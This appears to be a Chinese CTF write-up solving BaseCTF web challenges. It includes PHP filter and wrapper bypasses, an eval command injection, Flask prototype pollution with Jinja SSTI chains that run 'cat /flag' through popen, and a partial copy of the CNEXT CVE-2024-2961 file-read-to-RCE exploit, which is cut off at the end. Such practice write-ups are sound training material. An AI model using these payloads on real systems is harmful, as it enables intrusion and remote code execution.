# [个人队伍] CTF2026的Writeup

> **2025年6月25日12:00 ~ 2028年9月16日12:58**
>
> **比赛地址：https://gz.imxbt.cn/games/13/challenges**
>
> **复现地址：https://gz.imxbt.cn/games/13/challenges**

> 个人赛
>
> # BaseCTF2024新生赛
>
> **1833**支队伍已报名
>
> 开始时间
>
> 2025年6月25日中午12点00分
>
> 结束时间
>
> 2028年9月16日中午12点58分
>
> 
>
> WP可看https://cdisk.imxbt.cn/s/jRfM?path=%2Fwp 官方WPhttps://j0zr0js7k7j.feishu.cn/docx/MS06dyLGRoHBfzxGPF1cz0VhnGh



# All

## Web

### 数学大师

#### 题目信息

> ## 数学大师250 pts
>
> **出题:** Kengwang
> **难度:** 中等
>
> ------
>
> Kengwang 的数学特别差, 他的计算器坏掉了, 你能快速帮他完成数学计算题吗?
>
> > 每一道题目需要在 5 秒内解出, 传入到 `$_POST['answer']` 中, 解出 50 道即可, 除法取整
>
> 
>
> 本题依赖 session，请在请求时开启 session cookie

#### 解题过程

##### 查看题目

```shell
http://challenge.imxbt.cn:32439/
```

```shell
Your score is reset to 0Tell me in 3 second 762686÷1811596?
```

**分析**

- 考验脚本编写能力
- 注意session不要变post要连续不能断

##### 编写脚本

```python
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url, params=None): return request.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, params=params).content.decode()
def postByRequests(url, data=None): return request.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data).content.decode()
def getBySession(url, params=None): return session.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, params=params).content.decode()
def postBySession(url, data=None): return session.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data).content.decode()

result = postBySession("http://challenge.imxbt.cn:32439/")

for i in range(100):
    question = result.split("second ")[1].replace('?', '').replace('×', '*').replace('÷', '//')
    answer = eval(question)
    result = postBySession("http://challenge.imxbt.cn:32439/", {"answer": answer})
    print(f"[{i}]")
    print("question", question)
    print("answer", answer)
    print()
    if result.__contains__('{') & result.__contains__('}'):
        print(result)
        break
```

##### 发起攻击

```shell
[49]
question 8247390-4068927
answer 4178463

Correct! Your score is now 50You win!BaseCTF{1281a1d6-5107-4e21-b99d-7c0497c85319}
Tell me in 3 second 9093779×667907?
```

#### 题目答案

##### 最终脚本

```python
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url, params=None): return request.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, params=params).content.decode()
def postByRequests(url, data=None): return request.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data).content.decode()
def getBySession(url, params=None): return session.get(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, params=params).content.decode()
def postBySession(url, data=None): return session.post(url=url, headers={"User-Agent": fake_useragent.UserAgent().random}, data=data).content.decode()

result = postBySession("http://challenge.imxbt.cn:32439/")

for i in range(100):
    question = result.split("second ")[1].replace('?', '').replace('×', '*').replace('÷', '//')
    answer = eval(question)
    result = postBySession("http://challenge.imxbt.cn:32439/", {"answer": answer})
    print(f"[{i}]")
    print("question", question)
    print("answer", answer)
    print()
    if result.__contains__('{') & result.__contains__('}'):
        print(result)
        break
```

##### 得到答案

```shell
BaseCTF{1281a1d6-5107-4e21-b99d-7c0497c85319}
```



### 玩原神玩的

#### 题目信息

> ## 玩原神玩的250 pts
>
> **出题:** Datch
> **难度:** 中等
>
> ------
>
> flag怎么被分解成$array了，不管了，原神，启动！

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
error_reporting(0);

include 'flag.php';
if (sizeof($_POST['len']) == sizeof($array)) {
  ys_open($_GET['tip']);
} else {
  die("错了！就你还想玩原神？❌❌❌");
}

function ys_open($tip) {
  if ($tip != "我要玩原神") {
    die("我不管，我要玩原神！😭😭😭");
  }
  dumpFlag();
}

function dumpFlag() {
  if (!isset($_POST['m']) || sizeof($_POST['m']) != 2) {
    die("可恶的QQ人！😡😡😡");
  }
  $a = $_POST['m'][0];
  $b = $_POST['m'][1];
  if(empty($a) || empty($b) || $a != "100%" || $b != "love100%" . md5($a)) {
    die("某站崩了？肯定是某忽悠干的！😡😡😡");
  }
  include 'flag.php';
  $flag[] = array();
  for ($ii = 0;$ii < sizeof($array);$ii++) {
    $flag[$ii] = md5(ord($array[$ii]) ^ $ii);
  }
  
  echo json_encode($flag);
} 错了！就你还想玩原神？❌❌❌
```

**分析**

- 遍历**len[]**的长度

- **tip**=我要玩原神

- **m[0]**=100%

- **m[0]**=love100%+md5(100%)

- flag用正向解密

  ```python
  if md5(o ^ i).__eq__(flag[i]): print(chr(o),end='')
  ```

##### 编写脚本

```python
import hashlib
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url: str, params: dict = None, data: dict = None) -> str: return request.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postByRequests(url: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def getBySession(url: str, params: dict = None, data: dict = None) -> str: return session.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postBySession(url: str, data: dict = None, params: dict = None) -> str: return session.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()

def md5(content: str)->str:
    hex = hashlib.md5()
    hex.update(content.encode())
    return hex.hexdigest()

url = "http://challenge.imxbt.cn:30577/"

len_post = {"len[]": []}
tip_get = {"tip": "我要玩原神"}
m_post = {"m[]": ["100%", "love100%" + md5("100%")]}

for i in range(1, 100):
    len_post["len[]"].append(0)
    result = postByRequests(url, len_post)
    if result[-13:].__contains__("我不管，我要玩原神！😭😭😭"):
        result = postBySession(url, len_post | m_post, tip_get).split("</code>")[1]
        results = result.replace('[', '').replace(']', '').replace('"', '').split(',')
        flag = ""
        for j in range(len(results)):
            for o in range(256):
                if md5(str(o ^ j)).__eq__(results[j]):
                    print(chr(o), end = '')
                    break
        break
```

##### 发起攻击

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\test\python\2\Main.py 
BaseCTF{0d1fe6ac-2260-4bc4-a59a-c8bfdd024e49}
进程已结束，退出代码为 0
```

#### 题目答案

##### 最终脚本

```python
import hashlib
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url: str, params: dict = None, data: dict = None) -> str: return request.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postByRequests(url: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def getBySession(url: str, params: dict = None, data: dict = None) -> str: return session.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postBySession(url: str, data: dict = None, params: dict = None) -> str: return session.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()

def md5(content: str)->str:
    hex = hashlib.md5()
    hex.update(content.encode())
    return hex.hexdigest()

url = "http://challenge.imxbt.cn:30577/"

len_post = {"len[]": []}
tip_get = {"tip": "我要玩原神"}
m_post = {"m[]": ["100%", "love100%" + md5("100%")]}

for i in range(1, 100):
    len_post["len[]"].append(0)
    result = postByRequests(url, len_post)
    if result[-13:].__contains__("我不管，我要玩原神！😭😭😭"):
        result = postBySession(url, len_post | m_post, tip_get).split("</code>")[1]
        results = result.replace('[', '').replace(']', '').replace('"', '').split(',')
        flag = ""
        for j in range(len(results)):
            for o in range(256):
                if md5(str(o ^ j)).__eq__(results[j]):
                    print(chr(o), end = '')
                    break
        break
```

##### 得到答案

```shell
BaseCTF{0d1fe6ac-2260-4bc4-a59a-c8bfdd024e49}
```



### 1z_php

#### 题目信息

> ## z_php250 pts
>
> **出题:** J1ngHong
> **难度:** 中等
>
> ------
>
> php没有难题（Kengwang和晨曦出的除外）

#### 解题过程

##### 查看题目

```php
<?php
highlight_file('index.php');
# 我记得她...好像叫flag.php吧？
$emp=$_GET['e_m.p'];
$try=$_POST['c'];
if($emp!="114514"&&intval($emp,0)===114514)
{
    for ($i=0;$i<strlen($emp);$i++){
        if (ctype_alpha($emp[$i])){
            die("你不是hacker？那请去外场等候！");
        }
    }
    echo "只有真正的hacker才能拿到flag！"."<br>";

    if (preg_match('/.+?HACKER/is',$try)){
        die("你是hacker还敢自报家门呢？");
    }
    if (!stripos($try,'HACKER') === TRUE){
        die("你连自己是hacker都不承认，还想要flag呢？");
    }

    $a=$_GET['a'];
    $b=$_GET['b'];
    $c=$_GET['c'];
    if(stripos($b,'php')!==0){
        die("收手吧hacker，你得不到flag的！");
    }
    echo (new $a($b))->$c();
}
else
{
    die("114514到底是啥意思嘞？。？");
}
# 觉得困难的话就直接把shell拿去用吧，不用谢~
$shell=$_POST['shell'];
eval($shell);
?>
```

**分析**

- e_m.p解析成**e[m.p**，值为**114514.1**
- try用**"-"*1000001+"HACKER"**绕过
- a、b、c用**(new SplFileObject(php://filter/convert.base64-encode/resource=flag.php)) -> __toString()**
- shell用system('cat ./flag.php');

##### 编写脚本

```python
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url: str, params: dict = None, data: dict = None) -> str: return request.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postByRequests(url: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def getBySession(url: str, params: dict = None, data: dict = None) -> str: return session.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postBySession(url: str, data: dict = None, params: dict = None) -> str: return session.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()

url = "http://challenge.imxbt.cn:32407/"

emp_get = {"e[m.p": 114514.1}
try_post = {"try": "-"*1000001 + "HACKER"}

a_get = {"a": "SplFileObject"}
b_get = {"b": "php://filter/convert.base64-encode/resource=flag.php"}
c_get = {"c": "__toString"}

shell_post = {"shell": "system('cat ./flag.php');"}

result = postByRequests(url, try_post | shell_post, emp_get | a_get | b_get | c_get)

print(result)
```

##### 发起攻击

```shell
</code>只有真正的hacker才能拿到flag！<br>PD9waHAgPUJhc2VDVEZ7NjYyZWViNzYtZjNmNS00MTZhLTk1YzQtZjA1MGNlMTcwOWMzfT8+Cg==<?php =BaseCTF{662eeb76-f3f5-416a-95c4-f050ce1709c3}?>
```

#### 题目答案

##### 最终脚本

```python
import requests
import fake_useragent

request = requests
session = requests.Session()

def getByRequests(url: str, params: dict = None, data: dict = None) -> str: return request.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postByRequests(url: str, data: dict = None, params: dict = None) -> str: return request.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def getBySession(url: str, params: dict = None, data: dict = None) -> str: return session.get(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()
def postBySession(url: str, data: dict = None, params: dict = None) -> str: return session.post(url = url, headers = {"User-Agent": fake_useragent.UserAgent().random}, params = params, data = data).content.decode()

url = "http://challenge.imxbt.cn:32407/"

emp_get = {"e[m.p": 114514.1}
try_post = {"try": "-"*1000001 + "HACKER"}

a_get = {"a": "SplFileObject"}
b_get = {"b": "php://filter/convert.base64-encode/resource=flag.php"}
c_get = {"c": "__toString"}

shell_post = {"shell": "system('cat ./flag.php');"}

result = postByRequests(url, try_post | shell_post, emp_get | a_get | b_get | c_get)

print(result)
```

##### 题目答案

```shell
BaseCTF{662eeb76-f3f5-416a-95c4-f050ce1709c3}
```



### A Dark Room

#### 题目信息

> ## A Dark Room250 pts
>
> **出题:** Kengwang
> **难度:** 入门
>
> ------
>
> 文字游戏 玩得开心！

#### 解题过程

##### 查看源码

```shell
<!-- FLAG: BaseCTF{b63b4511-cb3c-4f40-acf6-945e6de034c4} -->
```

#### 题目答案

##### 得到答案

```shell
<!-- FLAG: BaseCTF{b63b4511-cb3c-4f40-acf6-945e6de034c4} -->
```



### Aura 酱的礼物

#### 题目信息

> ## Aura 酱的礼物250 pts
>
> **出题:** Kengwang
> **难度:** 简单
>
> ------
>
> 你好呀, Aura 酱，这是给你的礼物哦~ 快打开看看里面是什么吧！
>
> 
>
> Aura 的博客似乎没有留言区？但是真的要去 Aura 的博客里面找吗？可以换个地方找吗？
>
> 
>
> 哪里有感谢的一句话呢？远在天边，似乎就在眼前，就决定是他了吧！
>
> 
>
> 为什么 Flag 是空的？不对劲，base64 一下再看看？
>
> 
>
> 推荐搜索关键词: 伪协议，SSRF

#### 解题过程

##### 查看题目

```php
<?php
highlight_file(__FILE__);
// Aura 酱，欢迎回家~
// 这里有一份礼物，请你签收一下哟~
$pen = $_POST['pen'];
if (file_get_contents($pen) !== 'Aura')
{
    die('这是 Aura 的礼物，你不是 Aura！');
}

// 礼物收到啦，接下来要去博客里面写下感想哦~
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
}

// 嘿嘿，接下来要拆开礼物啦，悄悄告诉你，礼物在 flag.php 里面哦~
$gift = $_POST['gift'];
include($gift);
```

**分析**

- php伪协议
- pen=data://text/plain,Aura
- challenge=http://jasmineaura.github.io@localhost
- gift=php://filter/convert.base64-encode/resource=flag.php

##### 发起攻击

```shell
http://challenge.imxbt.cn:30277/
POST
pen=data://text/plain,Aura&
challenge=http://jasmineaura.github.io@localhost&
gift=php://filter/convert.base64-encode/resource=flag.php
```

```shell
PD9waHAgLy8gQmFzZUNURns1NzY1MjE5Ny01OTk2LTQ5NjktOThkYS05NTFjNzhjZTE5MzZ9ICBBdXJhIOmFseacieaLv+WIsOS4gOihgOWQl++8nwo=
```

```shell
<?php // BaseCTF{57652197-5996-4969-98da-951c78ce1936}  Aura 酱有拿到一血吗？
```

#### 题目答案

##### 最终payload

```shell
http://challenge.imxbt.cn:30277/
POST
pen=data://text/plain,Aura&
challenge=http://jasmineaura.github.io@localhost&
gift=php://filter/convert.base64-encode/resource=flag.php
```

##### 得到答案

```shell
BaseCTF{57652197-5996-4969-98da-951c78ce1936}
```



### HTTP 是什么呀

#### 题目信息

> ## HTTP 是什么呀250 pts
>
> **出题:** Kengwang
> **难度:** 入门
>
> ------
>
> 成为嘿客的第一步！当然是 HTTP 啦！
> 可以多使用搜索引擎搜索每个参数的含义以及传参方式
>
> 
>
> 看看你是怎么到达最后一个页面的，中途是不是经过了什么？
>
> 
>
> 这一串乱码是什么呀。等下，比赛好像叫做 BaseCTF？

#### 解题过程

##### 查看题目

```shell
看看你的 HTTP
项目	你需要传入	当前传入值	是否正确
GET 参数 basectf	we1c%00me		close (请注意 URL 转义)
POST 参数 Base	fl@g		close
Cookie c00k13	i can't eat it		close
用户代理 (User-Agent)	Base	Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36 Edg/147.0.0.0	close
来源 (Referer)	Base		close
你的 IP	127.0.0.1	10.10.235.192	close
一点小提示
给新手看看
Hi~ 欢迎参加 BaseCTF, 祝你玩的开心。这可能是你旅途的开始，但不要忘记，任何一个高手都是从菜鸟开始的。万事开头难，我们一起走上成为网络安全高手之路吧！

HTTP 协议是网络传输的最广泛使用的协议，你可以看看 MDN 文档 来了解了解（当然，这篇文档可能有点长和晦涩，但是特别详细，如果觉得不太好接受就看我下面写的内容吧~）

在开始之前，你可以找一个趁手的工具。下面是我经常使用的工具, 如果你发现工具无法下载完全可以在群里面问问, 当然如果实在下载不下来也没关系:

Hackbar
Chrome 浏览器 / Edge 浏览器: 下载链接 (可能需要科学上网, 下载不下来没关系)
FireFox 浏览器: 下载链接
这个是一个浏览器扩展，下载好后按 F12 打开开发者工具，你可以找到在开发者工具中找到他

image-20240222225316478

点击之后你可以点击 LOAD 来载入当前页面的请求

image-20240222225439213

最上方是你的请求地址 （URL），可能会包含问号并接着一些内容，这个叫做 POST 参数

左边是你的请求内容（payload/请求载荷），右边是你的 Header （请求头）

你可以随意编辑里面的内容，当你编辑完成后，你可以点击 EXECUTE 来进行请求。

 

BurpSuite
请注意, 这个软件存在收费版, 但是他的 Community 版本目前来说够用

下载链接

一般都会使用 BurpSuite 来进行 HTTP 请求的抓取和修改, 我们需要现在浏览器里面配置好代理转发

我们可以下载 ProxySwitchyOmega 插件, 在 Burp 的 Proxy (代理) 选项卡下找到 代理设置 (Proxy Settings)

image-20240725233303958

找到此处的代理端口, 我们进入到 ProxySwitchyOmega 插件的设置页面, 新增一个情景模式, 名称任意, 模式为代理服务器

image-20240725233422089

可以按照我的右边这样设置, 再点击左边的应用选项即可保存

在 Burp 的代理 (Proxy)页面下打开 拦截 (Intercept) 按钮, 即可开始抓包

之后在想要抓包的页面, 找到浏览器右上角的 ProxySwitchyOmega 插件

image-20240725233539240

点击刚刚创建好的情景模式, 此时页面会刷新, 回到 Burp 中, 你会看到当前的 HTTP 请求, 右键可以选择发送到 Repeater, 就可以在 重放器 (Repeater) 选项卡中找到他了, 我们此时可以再次点击拦截按钮来放行这个包

Yakit
下载链接

你可以跟随下载链接中的步骤尝试下载和安装，之后再打开默认项目

Yakit 可以完成中间人代理，Web Fuzzer 发包等一系列功能（听不懂也没关系），从新手到专业人士都可以使用

我们可以点开 MITM 开启中间人代理, 可以参照 Burp 的配置方式在浏览器中配置好代理, 当然, 你也可以选择免配置启动, 此时会自动配好所有的选项, 在 Yakit 中抓到包后, 你可以通过右键一个请求, 再点击 发送到 WebFuzzer 来对请求进行修改

或者我们可以从头开始

我们可以打开 Web Fuzzer

image-20240222230244367

你也可以在最上面的 渗透测试 选项卡中找到

在这里你可以看到一个 HTTP 请求最原本的样子

POST / HTTP/1.1
Content-Type: application/json
Host: www.example.com

{"key": "value"}
其中 POST 代表请求方法, 我们还可以用 GET, PUT 等动词

 

/ 代表请求的路径, 比如 /foo/index.php 表示请求站点根foo目录下的 index.php, 当然你可能在这里发现问号后面跟了一长串内容, 比如

index.php?foo=bar&chef=kw
问号后面的内容代表 GET 参数, 表示 GET 参数中: foo 为 bar, chef 为 kw

在这里的特殊符号需要进行 URLENCODE 转义, Yakit 给了我们一个方便的 fuzz 语法

{{url(abc%def)}}
表示将 abc%def 转义, 请求时会变成 %61%62%63%25%64%65%66, 别看这变成乱码了,但是服务器会自动翻译成我们原本的内容

 

HTTP/1.1 表示请求的 HTTP 版本, 我们暂时忽略, 当你在以后得请求走私的时候可能会了解到他

 

之后的内容我们称呼他为 Header:

 

Content-Type: 表示请求的载荷(payload)类型, 可以看看 文档

这个值可能为 application/x-www-form-urlencoded, multipart/form-data; boundary=something, application/json

不同的内容不一样

 

Host: 表示目标主机, 在 Yakit 中你需要指定这个来表示你的目标是什么, 当然, 你也可以在左边的真实 Host 里面设置设置

 

当然还有一些有用的 Header:

比如 Cookie, X-Forwarded-For, Referer, User-Agent, 大家可以搜索一下各自是干什么的

 

下面是一行空行, 表示 Header 结束, 接下来是请求载荷 (body)

 

这个地方内容的格式和 Content-Type 对应

 

如果 Content-Type 是 application/x-www-form-urlencoded, 那这个地方的格式和 GET 参数差不多, 比如

POST /somewhere HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

foo=a&bar=b
表示 foo 为 a, bar 为 b

 

如果 Content-Type 是 multipart/form-data; boundary=--------something

POST /foo HTTP/1.1
Content-Length: 68137
Content-Type: multipart/form-data; boundary=--------something

--------something
Content-Disposition: form-data; name="description"

some text
--------something
Content-Disposition: form-data; name="name"

hacker

--------something
其中 --------something 被当做分隔符, 这个和 Content-Type 中一直

这表示 description 为 some text, name 为 hacker

 

 

当你编辑好一个请求之后, 你可以 发送请求, 右侧会传来响应, 关于响应, 你可以看看这篇教程 教程

 

 

 

大概就是这么多, 如果还有不懂的问题欢迎在群里提问哦~
```

**分析**

- 说实话我对这一道题目的评价是很高的
- 甚至刷新了我对新生赛题目评价的新高

##### 发起攻击

```shell
http://challenge.imxbt.cn:30947/?basectf=we1c%2500me
POST Base=fl@g
Cookie c00k13=i can't eat it
User-Agent Base
Referer Base
X-Forwarded-For 127.0.0.1
```

```shell
谢谢参与!
当你重新踏上旅途之后，不要忘记旅途本身的意义

终点并不意味着一切，在抵达终点之前，用你的眼睛，多多观察这个世界吧……



看看在你来这里的路上有没有遗忘什么
```

```shell
http://challenge.imxbt.cn:30947/success.php?flag=QmFzZUNURnszZWU2MWRlOS01MDU2LTRhNmQtYTliNy1kMzUwYjdlMzZkNmR9Cg==
```

```shell
BaseCTF{3ee61de9-5056-4a6d-a9b7-d350b7e36d6d}
```

#### 题目答案

##### 最终payload

```shell
http://challenge.imxbt.cn:30947/?basectf=we1c%2500me
POST Base=fl@g
Cookie c00k13=i can't eat it
User-Agent Base
Referer Base
X-Forwarded-For 127.0.0.1
```

##### 得到答案

```shell
BaseCTF{3ee61de9-5056-4a6d-a9b7-d350b7e36d6d}
```



### Jinja Mark

#### 题目信息

> ## Jinja Mark251 pts
>
> **出题:** J1ngHong
> **难度:** 中等
>
> ------
>
> ssti注入只会用带花括号的payload？逊诶

#### 解题过程

##### 查看题目

```shell
http://challenge.imxbt.cn:32420/flag
```

```shell
你不会以为这里真的有flag吧？

想要flag的话先猜猜我的幸运数字

用POST方式把 lucky_number 告诉我吧，只有四位数哦
```

**分析**

- 用BP爆破出幸运数字得到部分源码

  ```python
  BLACKLIST_IN_index = ['{','}']
  def merge(src, dst):
      for k, v in src.items():
          if hasattr(dst, '__getitem__'):
              if dst.get(k) and type(v) == dict:
                  merge(v, dst.get(k))
              else:
                  dst[k] = v
          elif hasattr(dst, k) and type(v) == dict:
              merge(v, getattr(dst, k))
          else:
              setattr(dst, k, v)
  @app.route('/magic',methods=['POST', 'GET'])
  def pollute():
      if request.method == 'POST':
          if request.is_json:
              merge(json.loads(request.data), instance)
              return "这个魔术还行吧"
          else:
              return "我要json的魔术"
      return "记得用POST方法把魔术交上来"
  ```

  源码将'{'和'}'纳入了黑名单，然后存在原型链污染

##### 编写payload

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "jinja_env" : {
                    "variable_start_string" : "<<","variable_end_string":">>"
                }
            }
        }
    }
}
```

**分析**

- 将flask的ssti注入格式从{{}}改成了<<>>

##### 发起攻击

```shell
 ().__class__.__bases__[0].__subclasses__()
```

```shell
 ().__class__.__bases__[0].__subclasses__()[132]
```

```shell
().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen("ls"+" "+"/").read()
```

```shell
().__class__.__base__.__subclasses__()[132].__init__.__globals__.popen("cat"+" "+"/"+"flag").read()
```

```shell
BaseCTF{28e86efe-a8cd-405d-8a49-eee38bde1111}
```

#### 题目答案

##### 最终payload

```python
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                "jinja_env" : {
                    "variable_start_string" : "<<","variable_end_string":">>"
                }
            }
        }
    }
}
```

##### 得到答案

```shell
BaseCTF{28e86efe-a8cd-405d-8a49-eee38bde1111}
```



### Just Readme (前置)

#### 题目信息

> ## Just Readme (前置)351 pts
>
> **出题:** Kengwang
> **难度:** 中等偏难
>
> ------
>
> ```
> echo file_get_contents($_POST['file']);
> ```
>
> 仍然是执行 `/readflag`

#### 解题过程

##### 查看题目

```php
<?php
echo file_get_contents($_POST['file']);
```

**分析**

- **CVE-2024-2961**

##### 依赖下载

```shell
git clone --recurse-submodules https://github.com/ambionics/cnext-exploits.git
```

```shell
cd cnext-exploits
```

```shell
pip install -r requirements.txt
```

**分析**

- 这里建议使用Linux操作系统
- 这里建议使用Python3

##### 复制脚本

**no-content.py**

~~~python
#!/usr/bin/env python3
#
# CNEXT: PHP file-read to RCE
# Date: 2024-05-27
# Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)
#
# TODO Parse LIBC to know if patched
#
# INFORMATIONS
#
# To use, implement the Remote class, which tells the exploit how to send the payload.
#
# REQUIREMENTS
#
# Requires ten: https://github.com/cfreal/ten
#

from __future__ import annotations

import base64
import zlib
from dataclasses import dataclass

from pwn import *
from requests.exceptions import ChunkedEncodingError, ConnectionError
from ten import *

HEAP_SIZE = 2 * 1024 * 1024
BUG = "劄".encode("utf-8")


class Remote:
    """A helper class to send the payload and download files.

    The logic of the exploit is always the same, but the exploit needs to know how to
    download files (/proc/self/maps and libc) and how to send the payload.

    The code here serves as an example that attacks a page that looks like:

    ```php
    <?php

    $data = file_get_contents($_POST['file']);
    echo "File contents: $data";
    ```

    Tweak it to fit your target, and start the exploit.
    """

    def __init__(self, url: str) -> None:
        self.url = url
        self.session = Session()
    #path：filename,如果是魔改过后的利用，就把新利用方法的filename改成path，再加上其它条件就行
    #似乎需要linux环境才能执行成功
    def send(self, path: str) -> Response:
        """Sends given `path` to the HTTP server. Returns the response.
        """

        url =self.url
        data={
                "file":path   
        }

        return self.session.post(url,data=data)

    def download(self, path: str) -> bytes:
        """Returns the contents of a remote file.
        """
        path = f"php://filter/convert.base64-encode/resource={path}"
        response = self.send(path)
        #匹配语句记得根据题目环境更改
        #data = response.re.search(b"(.*)", flags=re.S).group(1)
        data=response.text
        return base64.decode(data)


@entry
@arg("url", "Target URL")
@arg("command", "Command to run on the system; limited to 0x140 bytes")
@arg("sleep_time", "Time to sleep to assert that the exploit worked. By default, 1.")
@arg("heap", "Address of the main zend_mm_heap structure.")
@arg(
    "pad",
    "Number of 0x100 chunks to pad with. If the website makes a lot of heap "
    "operations with this size, increase this. Defaults to 20.",
)
@dataclass
class Exploit:
    """CNEXT exploit: RCE using a file read primitive in PHP."""

    url: str
    command: str
    sleep: int = 1
    heap: str = None
    pad: int = 20

    def __post_init__(self):
        self.remote = Remote(self.url)
        self.log = logger("EXPLOIT")
        self.info = {}
        self.heap = self.heap and int(self.heap, 16)

    def check_vulnerable(self) -> None:
        """Checks whether the target is reachable and properly allows for the various
        wrappers and filters that the exploit needs.
        """

        def safe_download(path: str) -> bytes:
            try:
                return self.remote.download(path)
            except ConnectionError:
                failure("Target not [b]reachable[/] ?")

        def check_token(text: str, path: str) -> bool:
            result = safe_download(path)
            return text.encode() == result

        text = tf.random.string(50).encode()
        base64 = b64(text, misalign=True).decode()
        path = f"data:text/plain;base64,{base64}"

        result = safe_download(path)

        if text not in result:
            msg_failure("Remote.download did not return the test string")
            print("--------------------")
            print(f"Expected test string: {text}")
            print(f"Got: {result}")
            print("--------------------")
            failure("If your code works fine, it means that the [i]data://[/] wrapper does not work")

        msg_info("The [i]data://[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(text.encode(), misalign=True).decode()
        path = f"php://filter//resource=data:text/plain;base64,{base64}"
        if not check_token(text, path):
            failure("The [i]php://filter/[/] wrapper does not work")

        msg_info("The [i]php://filter/[/] wrapper works")

        text = tf.random.string(50)
        base64 = b64(compress(text.encode()), misalign=True).decode()
        path = f"php://filter/zlib.inflate/resource=data:text/plain;base64,{base64}"

        if not check_token(text, path):
            failure("The [i]zlib[/] extension is not enabled")

        msg_info("The [i]zlib[/] extension is enabled")

        msg_success("Exploit preconditions are satisfied")

    def get_file(self, path: str) -> bytes:
        with msg_status(f"Downloading [i]{path}[/]..."):
            return self.remote.download(path)

    def get_regions(self) -> list[Region]:
        """Obtains the memory regions of the PHP process by querying /proc/self/maps."""
        maps = self.get_file("/proc/self/maps")
        maps = maps.decode()
        PATTERN = re.compile(
            r"^([a-f0-9]+)-([a-f0-9]+)\b" r".*" r"\s([-rwx]{3}[ps])\s" r"(.*)"
        )
        regions = []
        for region in table.split(maps, strip=True):
            if match := PATTERN.match(region):
                start = int(match.group(1), 16)
                stop = int(match.group(2), 16)
                permissions = match.group(3)
                path = match.group(4)
                if "/" in path or "[" in path:
                    path = path.rsplit(" ", 1)[-1]
                else:
                    path = ""
                current = Region(start, stop, permissions, path)
                regions.append(current)
            else:
                print(maps)
                failure("Unable to parse memory mappings")

        self.log.info(f"Got {len(regions)} memory regions")

        return regions

    def get_symbols_and_addresses(self) -> None:
        """Obtains useful symbols and addresses from the file read primitive."""
        regions = self.get_regions()

        LIBC_FILE = "/dev/shm/cnext-libc"

        # PHP's heap

        self.info["heap"] = self.heap or self.find_main_heap(regions)

        # Libc

        libc = self._get_region(regions, "libc-", "libc.so")

        self.download_file(libc.path, LIBC_FILE)

        self.info["libc"] = ELF(LIBC_FILE, checksec=False)
        self.info["libc"].address = libc.start

    def _get_region(self, regions: list[Region], *names: str) -> Region:
        """Returns the first region whose name matches one of the given names."""
        for region in regions:
            if any(name in region.path for name in names):
                break
        else:
            failure("Unable to locate region")

        return region

    def download_file(self, remote_path: str, local_path: str) -> None:
        """Downloads `remote_path` to `local_path`"""
        data = self.get_file(remote_path)
        Path(local_path).write(data)

    def find_main_heap(self, regions: list[Region]) -> Region:
        # Any anonymous RW region with a size superior to the base heap size is a
        # candidate. The heap is at the bottom of the region.
        heaps = [
            region.stop - HEAP_SIZE + 0x40
            for region in reversed(regions)
            if region.permissions == "rw-p"
            and region.size >= HEAP_SIZE
            and region.stop & (HEAP_SIZE - 1) == 0
            and region.path == ""
        ]

        if not heaps:
            failure("Unable to find PHP's main heap in memory")

        first = heaps[0]

        if len(heaps) > 1:
            heaps = ", ".join(map(hex, heaps))
            msg_info(f"Potential heaps: [i]{heaps}[/] (using first)")
        else:
            msg_info(f"Using [i]{hex(first)}[/] as heap")

        return first

    def run(self) -> None:
        self.check_vulnerable()
        self.get_symbols_and_addresses()
        self.exploit()

    def build_exploit_path(self) -> str:

